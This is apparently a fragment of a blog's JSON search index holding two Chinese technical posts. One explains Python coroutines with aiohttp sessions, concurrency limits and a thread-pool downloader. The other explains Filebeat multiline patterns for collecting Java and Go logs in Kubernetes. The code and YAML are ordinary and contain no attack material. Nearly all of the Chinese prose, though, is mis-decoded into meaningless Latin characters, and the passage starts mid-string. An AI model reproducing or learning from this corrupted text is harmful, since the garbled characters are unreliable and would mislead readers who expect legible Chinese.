å–å‡ºæ¥ï¼Œä¾›åé¢çš„åç¨‹å†å¤ç”¨å°±å¯ä»¥äº†ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š\nimport aiohttp import asyncio async def login(): my_conn = aiohttp.TCPConnector(limit=10) async with aiohttp.ClientSession(connector=my_conn) as session: data = {\u0026#39;loginname\u0026#39;:\u0026#39;wangbadan\u0026#39;,\u0026#39;password\u0026#39;:\u0026#39;Fuckyouall\u0026#39;} async with session.post(\u0026#39;http://192.168.1.3/user/login\u0026#39;,data=data) as resp: print(resp.url) print(resp.status) print(await resp.text()) return session session = asyncio.run(login()) print(f\u0026#34;{session}\u0026#34;) å†ç»™ä¸€ä¸ªå®Œå…¨ç‰ˆçš„ä¸»å‡½æ•°æ˜¯è¿›ç¨‹ï¼Œä¸‹è½½æ˜¯åç¨‹çš„ä¾‹å­ï¼Œæ³¨æ„é‡Œé¢çš„ aiohttp.TCPConnector(limit=10)ï¼Œé™åˆ¶ä¸€ä¸‹å¹¶å‘æ˜¯10ä¸ªï¼Œå¦åˆ™ä¼šè¢«æœåŠ¡å™¨ Ban æ‰ï¼š\nimport asyncio import time import aiohttp from aiohttp.client import ClientSession async def download_link(url:str,session:ClientSession): async with session.get(url) as response: result = await response.text() print(f\u0026#39;Read {len(result)} from {url}\u0026#39;) async def download_all(urls:list): my_conn = aiohttp.TCPConnector(limit=10) async with aiohttp.ClientSession(connector=my_conn) as session: tasks = [] for url in urls: task = asyncio.ensure_future(download_link(url=url,session=session)) tasks.append(task) await asyncio.gather(*tasks,return_exceptions=True) # the await must be nest inside of the session url_list = [\u0026#34;https://www.google.com\u0026#34;,\u0026#34;https://www.bing.com\u0026#34;]*50 print(url_list) start = time.time() asyncio.run(download_all(url_list)) end = time.time() print(f\u0026#39;download {len(url_list)} links in {end - start} seconds\u0026#39;) åç¨‹é‡Œçš„ session ä¹Ÿæœ‰å¾ˆå¤šç§ç”¨æ³•ï¼Œå‚è€ƒä¸‹é¢çš„é“¾æ¥å°±å¥½ï¼š\nhttps://blog.csdn.net/weixin_39643613/article/details/109171090\næˆ‘ä»¬ä¹Ÿç»™å‡ºç®€å•æ˜“ç”¨çš„çº¿ç¨‹æ± ç‰ˆï¼Œè¯´ä¸å®šä»¥åä¼šç”¨ä¸Šï¼š\nimport requests from requests.sessions import Session import time from concurrent.futures import ThreadPoolExecutor from threading import Thread,local url_list = [\u0026#34;https://www.google.com/\u0026#34;,\u0026#34;https://www.bing.com\u0026#34;]*50 thread_local = local() def get_session() -\u0026gt; Session: if not hasattr(thread_local,\u0026#39;session\u0026#39;): thread_local.session = requests.Session() return thread_local.session def download_link(url:str): session = get_session() with session.get(url) as response: print(f\u0026#39;Read {len(response.content)} from {url}\u0026#39;) def download_all(urls:list) -\u0026gt; None: with ThreadPoolExecutor(max_workers=10) as executor: executor.map(download_link,url_list) start = time.time() download_all(url_list) end = time.time() print(f\u0026#39;download {len(url_list)} links in {end - start} seconds\u0026#39;) ","permalink":"https://rendoumi.com/posts/20211112-python_aiohttp/","summary":"\u003cp\u003eåœ¨å®é™…ä¸­é‡åˆ°è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œå…¬å¸è½¯ä»¶å‘å¸ƒä¸Šçº¿è‡ªåŠ¨åŒ–ã€‚\u003c/p\u003e\n\u003cp\u003eè¯´ç®€å•ç‚¹ï¼Œå°±æ˜¯éœ€è¦å»ç™»å½•ä¸€ä¸ªä¸Šçº¿çš„å†…éƒ¨ç½‘ç«™ï¼Œç„¶åçˆ¬ä¸‹æ‰€æœ‰çš„ä¸Šçº¿æ•°æ®ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åæ ¹æ®çˆ¬ä¸‹æ¥çš„æ•°æ®æ•´ç†å¥½ï¼Œå¯ä»¥ä¸€èµ·ä¸Šçº¿çš„ï¼Œå°±å¹¶å‘å¤šçº¿ç¨‹ï¼Œå…¶å®å°±æ˜¯å»ä¼ å‚æ•°ç‚¹å‡»ä¸€ä¸ªé“¾æ¥ç­‰è¿”å›ã€‚\u003c/p\u003e\n\u003cp\u003eä¸èƒ½å¹¶å‘çš„å°±å•çº¿ç¨‹ç‚¹é“¾æ¥ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£è¿™ä¸ªäº‹æƒ…å¿…é¡»æ›´æœ‰æ•ˆç‡ï¼Œå•çº¿ç¨‹çš„æ²¡é—®é¢˜ï¼Œç”¨ python çš„ request å°±å¯ä»¥å®ç°äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ä»”ç»†ç ”ç©¶ä¸€ä¸‹åç¨‹ï¼Œå…ˆè®²ä¸€ä¸‹å†å²ï¼š\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨Pythonçš„äººå¾€å¾€çº ç»“åœ¨å¤šçº¿ç¨‹ã€å¤šè¿›ç¨‹ï¼Œå“ªä¸ªæ•ˆç‡æ›´é«˜ï¼Ÿåˆ°åº•ç”¨å“ªä¸ªå¥½å‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå…¶å® Python çš„å¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹ï¼Œç›¸å¯¹äºåˆ«å®¶çš„åç¨‹å’Œå¼‚æ­¥å¤„ç†æœºåˆ¶ï¼Œéƒ½ä¸è¡Œï¼Œçº¿ç¨‹ä¹‹é—´åˆ‡æ¢è€—è´¹ CPU å’Œå¯„å­˜å™¨ï¼ŒOS çš„è°ƒåº¦ä¸å¯æ§ï¼Œå¤šè¿›ç¨‹ä¹‹é—´é€šè®¯ä¹Ÿä¸ä¾¿ã€‚æ€§èƒ½æ ¹æœ¬ä¸è¡Œã€‚\u003c/p\u003e\n\u003cp\u003eåæ¥å‘¢ Python æ”¹è¿›äº†è¯­æ³•ï¼Œå‡ºç°äº† yiled from å……å½“åç¨‹è°ƒåº¦ï¼Œæœ‰äººå°±æ ¹æ®è¿™ä¸ªç‰¹æ€§å¼€å‘äº†ç¬¬ä¸‰æ–¹çš„åç¨‹æ¡†æ¶ï¼ŒTornadoï¼ŒGeventç­‰ã€‚\u003c/p\u003e\n\u003cp\u003eå®˜æ–¹ä¹Ÿä¸èƒ½åè§†ä¸ç†å•Šï¼Œä»»å‡­åˆ«äººå‡ºé£å¤´ï¼Œäºæ˜¯ Python ä¹‹çˆ¶æ·±å…¥ç®€å‡º3å¹´ï¼Œè‹¦å¿ƒé’»ç ”è‡ªå®¶çš„åç¨‹ï¼Œasync/await å’Œ asyncio åº“ï¼Œå¹¶æ”¾åˆ° Python3.5 åæˆä¸ºå®˜æ–¹åŸç”Ÿçš„åç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003eå¯¹äº httpè¯·æ±‚ã€è¯»å†™æ–‡ä»¶ã€è¯»å†™æ•°æ®åº“è¿™ç§é«˜å»¶æ—¶çš„ IO æ“ä½œï¼Œåç¨‹æ˜¯ä¸ªå¤§æ€å™¨ï¼Œä¼˜ç‚¹éå¸¸å¤šï¼›å®ƒå¯ä»¥åœ¨é¢„æ–™åˆ°ä¸€ä¸ªé˜»å¡å°†å‘ç”Ÿæ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œè·‘å»æ‰§è¡Œå…¶å®ƒåç¨‹ï¼ŒåŒæ—¶æŠŠäº‹ä»¶æ³¨å†Œåˆ°å¾ªç¯ä¸­ï¼Œå®ç°äº†å¤šåç¨‹å¹¶å‘ï¼Œå…¶å®è¿™ç©æ„æ˜¯è·Ÿ Nodejs çš„å›è°ƒå­¦çš„ã€‚\u003c/p\u003e\n\u003cp\u003eçœ‹ä¸‹å›¾ï¼Œè¯¦ç»†è§£é‡Šä¸‹ï¼Œå·¦è¾¹æˆ‘ä»¬æœ‰100ä¸ªç½‘é¡µè¯·æ±‚ï¼Œå¹¶å‘100ä¸ªåç¨‹è¯·æ±‚ï¼ˆå…¶å®ä¹Ÿæ˜¯1ä¸ª1ä¸ªå‘ï¼‰ï¼Œå½“éœ€è¦ç­‰å¾…é•¿æ—¶é—´å›åº”å›åº”æ—¶ï¼ŒæŒ‚èµ·å½“å‰åç¨‹ï¼Œå¹¶æ³¨å†Œä¸€ä¸ªå›è°ƒå‡½æ•°åˆ°äº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰ä¸­ï¼Œæ‰§è¡Œä¸‹ä¸€ä¸ªåç¨‹ï¼Œå½“æœ‰åç¨‹äº‹ä»¶å®Œæˆå†é€šè¿‡å›è°ƒå‡½æ•°å”¤é†’æŒ‚èµ·çš„åç¨‹ï¼Œç„¶åè¿”å›ç»“æœã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20211112-python_aiohttp/image-20211112085624811.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªè·Ÿ nodejs çš„å›è°ƒå‡½æ•°åŸºæœ¬ä¸€æ ·ï¼Œæˆ‘ä»¬å¿…é¡»æ³¨æ„ä¸»è¿›ç¨‹å’Œåç¨‹çš„å…³ç³»ï¼Œå¦‚æœæˆ‘åœ¨ä¸€ä¸ªä¸»è¿›ç¨‹ä¸­ï¼Œè§¦å‘åç¨‹å‡½æ•°ï¼Œæœ‰100ä¸ªåç¨‹ï¼Œé‚£ä¹ˆå¿…é¡»ç­‰å¾…100ä¸ªåç¨‹éƒ½ç»“æŸåï¼Œæ‰èƒ½å›åˆ°æ­£å¸¸çš„é‚£ä¸ªä¸»è¿›ç¨‹ä¸­ã€‚å½“ç„¶ï¼Œä¸»è¿›ç¨‹ä¹Ÿå¯èƒ½ä¹Ÿæ˜¯ä¸€ä¸ªåç¨‹ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆåç¨‹çš„åŸºæœ¬ç”¨æ³•\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003easync f(n) å£°æ˜ä¸€ä¸ªå‡½æ•°æ˜¯åç¨‹çš„\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eawait f(n) æŒ‚èµ·å½“å‰åç¨‹ï¼ŒæŠŠæ§åˆ¶æƒäº¤å› event loopï¼Œå¹¶ä¸”æ‰§è¡Œf(n)å’Œæ³¨å†Œä¹‹åçš„f(n)å›è°ƒã€‚\u003c/p\u003e\n\u003cp\u003eä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœåœ¨ g() è¿™ä¸ªå‡½æ•°ä¸­æ‰§è¡Œäº† await f()ï¼Œé‚£ä¹ˆg()å‡½æ•°ä¼šè¢«æŒ‚èµ·ï¼Œå¹¶ç­‰å¾… f() å‡½æ•°æœ‰ç»“æœç»“æŸï¼Œç„¶åè¿”å› g() ç»§ç»­æ‰§è¡Œã€‚\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003eaiohttp\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eClientSession\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003ewith\u003c/span\u003e \u003cspan class=\"n\"\u003esession\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003eas\u003c/span\u003e \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"n\"\u003eresponse\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åä¸€è¡Œ await æ˜¯æŒ‚èµ·å‘½ä»¤ï¼ŒæŒ‚èµ·å½“å‰å‡½æ•° get() ï¼Œå¹¶æ‰§è¡Œ response.text() å’Œæ³¨å†Œå›è°ƒï¼Œç­‰å¾… response.text() æ‰§è¡Œå®Œæˆåé‡æ–°æ¿€æ´»å½“å‰å‡½æ•¸get()ç»§ç»­æ‰§è¡Œï¼Œè¿”å›ã€‚\u003c/p\u003e","title":"Pythonçš„åç¨‹è¯¦ç»†è§£é‡Š"},{"content":"æˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•åœ¨ kubernetes ç¯å¢ƒä¸­ä½¿ç”¨ filebeat sidecar æ–¹å¼æ”¶é›†æ—¥å¿—\nä½¿ç”¨çš„æ˜¯ filebeat çš„ moudle æ¨¡å—ï¼Œä½†å‡¡æ˜¯å¸¸ç”¨çš„è½¯ä»¶ï¼ŒåŸºæœ¬éƒ½æœ‰å¯¹åº”çš„æ¨¡å—å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆåº”è¯¥ä½¿ç”¨æ¨¡å—æ¥æ”¶é›†æ—¥å¿—ã€‚\né‚£å¯¹äºä¸€äº›æˆ‘ä»¬è‡ªå·±å†™çš„ Go è½¯ä»¶å‘¢ï¼Œæˆ–è€…æ ¹æœ¬ä¸æ˜¯æ ‡å‡†çš„ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\né‚£å°±è‡ªå®šä¹‰ filebeat.inputsï¼Œç½‘ä¸Šçš„ filebeat ä¾‹å­ï¼Œå…¶å®å¤§å¤šéƒ½æ˜¯è¿™æ ·çš„\nå¾ˆç®€å•ï¼Œç»™ä¸ªä¾‹å­\n[beat-logstash-some-name-832-2015.11.28] IndexNotFoundException[no such index] at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:566) at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:133) at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:77) at org.elasticsearch.action.admin..checkBlock(TransportDeleteIndexAction.java:75) çœ‹å¦‚ä¸Šæ—¥å¿—ï¼Œå¦‚æœä¸ç”¨æ¨¡å¼åŒ¹é…çš„è¯ï¼Œé‚£ä¹ˆä¼šé€5æ¡è®°å½•åˆ° ESï¼Œ Kibana çœ‹èµ·æ¥å°±ååˆ†å‰²è£‚äº†ã€‚\næ‰€ä»¥è¦ç”¨æ­£åˆ™æŠŠåº•ä¸‹çš„4è¡Œå’Œä¸Šé¢çš„ç¬¬1è¡Œåˆåœ¨ä¸€èµ·ï¼Œåˆå¹¶æˆä¸€æ¡å°±è®°å½•æ¨é€åˆ° ES å»\nä»”ç»†è§‚å¯Ÿï¼Œå¼€å¤´ä¸€è¡Œæ˜¯ä»¥ [ å¼€å§‹çš„ï¼Œæ‰€ä»¥æ­£åˆ™å°±æ˜¯ \u0026lsquo;^\\[\u0026rsquo;ï¼Œæˆ‘ä»¬è¦åŒ¹é…çš„æ˜¯åº•ä¸‹çš„4è¡Œï¼Œå¿…é¡»åè½¬ä¸€ä¸‹æ¨¡å¼ã€‚\nmultiline çš„ negate å±æ€§ï¼Œè¿™ä¸ªæ˜¯æŒ‡å®šæ˜¯å¦åè½¬åŒ¹é…åˆ°çš„å†…å®¹ï¼Œè¿™é‡Œå¦‚æœæ˜¯ true çš„è¯ï¼Œåè½¬ï¼Œé‚£å°±æ˜¯é€‰æ‹©ä¸ä»¥ [ å¼€å¤´çš„è¡Œã€‚ netgate å±æ€§çš„ç¼ºçœå€¼æ˜¯ false\nmultiline çš„ match å±æ€§ï¼Œafter æŒ‡è¿½åŠ åˆ°ä¸Šä¸€æ¡äº‹ä»¶ï¼ˆå‘ä¸Šåˆå¹¶ï¼‰ï¼Œbefore æŒ‡åˆå¹¶åˆ°ä¸‹ä¸€æ¡ï¼ˆå‘ä¸‹åˆå¹¶ï¼‰\näºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºä»¥ä¸‹çš„åŒ¹é…æ¨¡å¼ï¼Œè¿™æ ·å°±æŠŠåŒ¹é…åˆ°æ¡ç›®è¿½åŠ åˆ°ä¸Šä¸€æ¡ï¼Œåˆå¹¶åœ¨ä¸€èµ·äº†ï¼š\nfilebeat.inputs: - type: log enabled: true paths: - /Users/liuxg/data/multiline/multiline.log multiline.type: pattern multiline.pattern: \u0026#39;^\\[\u0026#39; multiline.negate: true multiline.match: after output.elasticsearch: hosts: [\u0026#34;localhost:9200\u0026#34;] index: \u0026#34;multiline\u0026#34; å†ç»™ä¸ªä¾‹å­ï¼Œjava çš„ stack è°ƒç”¨ï¼Œæ—¥å¿—æ ¼å¼å¦‚ä¸‹ï¼š\nException in thread \u0026#34;main\u0026#34; java.lang.NullPointerException at com.example.myproject.Book.getTitle(Book.java:16) at com.example.myproject.Author.getBookTitles(Author.java:25) at com.example.myproject.Bootstrap.main(Bootstrap.java:14) åˆ†æä¸€ä¸‹ï¼š\nåŒ¹é…åˆ°å¼€å¤´æ˜¯ç©ºæ ¼çš„é‚£äº›è¡Œï¼Œæ­£åˆ™ \u0026lsquo;^[[:space]]\u0026rsquo; åŒ¹é…çš„è¡Œä¸åè½¬ï¼Œå°±æ˜¯è¦é‚£äº›ç©ºæ ¼å¼€å¤´çš„è¡Œï¼Œæ‰€ä»¥ negate æ˜¯ç¼ºçœçš„ false åŒ¹é…çš„ç©ºæ ¼è¡Œè¿½åŠ åˆ°ä¸Šä¸€ä¸ªäº‹ä»¶ï¼Œå‘ä¸Šåˆå¹¶ï¼Œæ‰€ä»¥ match æ˜¯ after filebeat.inputs: - type: log enabled: true paths: - /Users/liuxg/data/multiline/multiline.log multiline.type: pattern multiline.pattern: \u0026#39;^[[:space:]]\u0026#39; multiline.negate: false multiline.match: after å†ç»™ä¸ªä¾‹å­ï¼Œå‡å¦‚ä½ åœ¨ Go ç¨‹åºé‡Œå®šä¹‰äº†è¾“å‡ºæ—¥å¿—çš„æ ¼å¼ï¼Œä»¥ Start new event å¼€å¤´ï¼Œä»¥ End event ç»“å°¾\n[2015-08-24 11:49:14,389] Start new event [2015-08-24 11:49:14,395] Content of processing something [2015-08-24 11:49:14,399] End event [2015-08-24 11:50:14,389] Some other log [2015-08-24 11:50:14,395] Some other log [2015-08-24 11:50:14,399] Some other log [2015-08-24 11:51:14,389] Start new event [2015-08-24 11:51:14,395] Content of processing something [2015-08-24 11:51:14,399] End event æˆ‘ä»¬å°±ç”¨åˆ° filebeat multiline çš„å¦ä¸€ä¸ªå¼€å…³ï¼Œflush_patternï¼Œæ¥æ§åˆ¶å¦‚ä½•ç»“æŸï¼Œæ³¨æ„ negate æ˜¯ true ï¼ŒåŒ¹é…åˆ°çš„æ˜¯ Start å’Œ End ä¸­é—´çš„éƒ¨åˆ†ï¼š\nmultiline.type: pattern multiline.pattern: \u0026#39;Start new event\u0026#39; multiline.negate: true multiline.match: after multiline.flush_pattern: \u0026#39;End event\u0026#39; filebeat.inputs: - type: log enabled: true paths: - /Users/liuxg/data/multiline/multiline.log multiline.type: pattern multiline.pattern: \u0026#39;Start new event\u0026#39; multiline.negate: true multiline.match: after multiline.flush_pattern: \u0026#39;End event\u0026#39; ç»™ä¸¤ç¯‡å‚è€ƒï¼Œå¤§å®¶ä¸€å®šè¦å…ˆçœ‹é‚£ç¯‡åŸç‰ˆè‹±æ–‡çš„ï¼Œä¸­æ–‡çš„é‚£ç¯‡ç¿»å¾—ä¸å¤ªå¥½ï¼›æœ€å¥½ä¸¤ç¯‡å¯¹ç…§ç€çœ‹ã€‚\nå‚è€ƒï¼š\nhttps://www.elastic.co/guide/en/beats/filebeat/current/multiline-examples.html https://developer.aliyun.com/article/764544 ","permalink":"https://rendoumi.com/posts/20211111-k8s_filebeat/","summary":"\u003cp\u003eæˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•åœ¨ kubernetes ç¯å¢ƒä¸­ä½¿ç”¨ filebeat sidecar æ–¹å¼æ”¶é›†æ—¥å¿—\u003c/p\u003e\n\u003cp\u003eä½¿ç”¨çš„æ˜¯ filebeat çš„ moudle æ¨¡å—ï¼Œä½†å‡¡æ˜¯å¸¸ç”¨çš„è½¯ä»¶ï¼ŒåŸºæœ¬éƒ½æœ‰å¯¹åº”çš„æ¨¡å—å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆåº”è¯¥ä½¿ç”¨æ¨¡å—æ¥æ”¶é›†æ—¥å¿—ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£å¯¹äºä¸€äº›æˆ‘ä»¬è‡ªå·±å†™çš„ Go è½¯ä»¶å‘¢ï¼Œæˆ–è€…æ ¹æœ¬ä¸æ˜¯æ ‡å‡†çš„ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eé‚£å°±è‡ªå®šä¹‰ filebeat.inputsï¼Œç½‘ä¸Šçš„ filebeat ä¾‹å­ï¼Œå…¶å®å¤§å¤šéƒ½æ˜¯è¿™æ ·çš„\u003c/p\u003e\n\u003cp\u003eå¾ˆç®€å•ï¼Œç»™ä¸ªä¾‹å­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003e[beat-logstash-some-name-832-2015.11.28] IndexNotFoundException[no such index]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:566)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:133)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:77)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eat org.elasticsearch.action.admin..checkBlock(TransportDeleteIndexAction.java:75)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹å¦‚ä¸Šæ—¥å¿—ï¼Œå¦‚æœä¸ç”¨æ¨¡å¼åŒ¹é…çš„è¯ï¼Œé‚£ä¹ˆä¼šé€5æ¡è®°å½•åˆ° ESï¼Œ Kibana çœ‹èµ·æ¥å°±ååˆ†å‰²è£‚äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ‰€ä»¥è¦ç”¨æ­£åˆ™æŠŠåº•ä¸‹çš„4è¡Œå’Œä¸Šé¢çš„ç¬¬1è¡Œåˆåœ¨ä¸€èµ·ï¼Œåˆå¹¶æˆä¸€æ¡å°±è®°å½•æ¨é€åˆ° ES å»\u003c/p\u003e\n\u003cp\u003eä»”ç»†è§‚å¯Ÿï¼Œå¼€å¤´ä¸€è¡Œæ˜¯ä»¥ [ å¼€å§‹çš„ï¼Œæ‰€ä»¥æ­£åˆ™å°±æ˜¯ \u0026lsquo;^\\[\u0026rsquo;ï¼Œæˆ‘ä»¬è¦åŒ¹é…çš„æ˜¯åº•ä¸‹çš„4è¡Œï¼Œå¿…é¡»åè½¬ä¸€ä¸‹æ¨¡å¼ã€‚\u003c/p\u003e\n\u003cp\u003emultiline çš„ negate å±æ€§ï¼Œè¿™ä¸ªæ˜¯æŒ‡å®šæ˜¯å¦åè½¬åŒ¹é…åˆ°çš„å†…å®¹ï¼Œè¿™é‡Œå¦‚æœæ˜¯ true çš„è¯ï¼Œåè½¬ï¼Œé‚£å°±æ˜¯é€‰æ‹©ä¸ä»¥ [ å¼€å¤´çš„è¡Œã€‚ netgate å±æ€§çš„ç¼ºçœå€¼æ˜¯ false\u003c/p\u003e\n\u003cp\u003emultiline çš„ match å±æ€§ï¼Œafter æŒ‡è¿½åŠ åˆ°ä¸Šä¸€æ¡äº‹ä»¶ï¼ˆå‘ä¸Šåˆå¹¶ï¼‰ï¼Œbefore æŒ‡åˆå¹¶åˆ°ä¸‹ä¸€æ¡ï¼ˆå‘ä¸‹åˆå¹¶ï¼‰\u003c/p\u003e\n\u003cp\u003eäºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºä»¥ä¸‹çš„åŒ¹é…æ¨¡å¼ï¼Œè¿™æ ·å°±æŠŠåŒ¹é…åˆ°æ¡ç›®è¿½åŠ åˆ°ä¸Šä¸€æ¡ï¼Œåˆå¹¶åœ¨ä¸€èµ·äº†ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003efilebeat.inputs:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003e- type: log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eenabled: true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003epaths:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"na\"\u003e- /Users/liuxg/data/multiline/multiline.log\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.type: pattern\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.pattern: \u0026#39;^\\[\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.negate: true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emultiline.match: after\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eoutput.elasticsearch:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"na\"\u003ehosts: [\u0026#34;localhost:9200\u0026#34;]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"na\"\u003eindex: \u0026#34;multiline\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå†ç»™ä¸ªä¾‹å­ï¼Œjava çš„ stack è°ƒç”¨ï¼Œæ—¥å¿—æ ¼å¼å¦‚ä¸‹ï¼š\u003c/p\u003e","title":"kubernetesä½¿ç”¨filebeat multilineè‡ªå®šä¹‰æ”¶é›†æ—¥å¿—"},{"content":"åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ Kubernetes ï¼Œç»•ä¸è¿‡å»çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æŒä¹…åŒ–å·ã€‚\nå¦‚æœæ˜¯ä½¿ç”¨é˜¿é‡Œ ACK 